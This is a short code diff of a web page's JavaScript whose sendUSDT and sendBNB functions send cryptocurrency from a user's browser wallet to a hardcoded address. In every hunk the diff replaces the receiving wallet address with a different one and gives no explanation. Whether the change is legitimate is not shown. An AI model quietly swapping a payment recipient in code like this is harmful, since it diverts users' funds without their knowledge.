@@ -179,7 +179,7 @@ async function sendUSDT() {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
 
           const tokenAddress = '0x55d398326f99059fF775485246999027B3197955'; // Dirección del contrato USDT
-          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5'; // Dirección a la que se enviarán los USDT
+          const receiverAddress = '0x45A4b2DEb4e39A483c7b3593C6067e131Daa2e29'; // Dirección a la que se enviarán los USDT
 
           // Preparar la transacción
           const transactionParameters = {
@@ -267,7 +267,7 @@ async function sendBNB() {
       if (typeof window.ethereum !== 'undefined') {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5'; // Dirección a la que se enviarán los BNB
+          const receiverAddress = '0x45A4b2DEb4e39A483c7b3593C6067e131Daa2e29'; // Dirección a la que se enviarán los BNB
 
           // Preparar la transacción
           const transactionParameters = {
@@ -321,7 +321,7 @@ async function sendUSDT() {
               return;
           }
 
-          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5';
+          const receiverAddress = '0x45A4b2DEb4e39A483c7b3593C6067e131Daa2e29';
 
           const transactionParameters = {
               to: tokenAddress,
@@ -366,7 +366,7 @@ async function sendBNB() {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           const web3 = new Web3(window.ethereum);
 
-          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5';
+          const receiverAddress = '0x45A4b2DEb4e39A483c7b3593C6067e131Daa2e29';
 
           const transactionParameters = {
               to: receiverAddress,
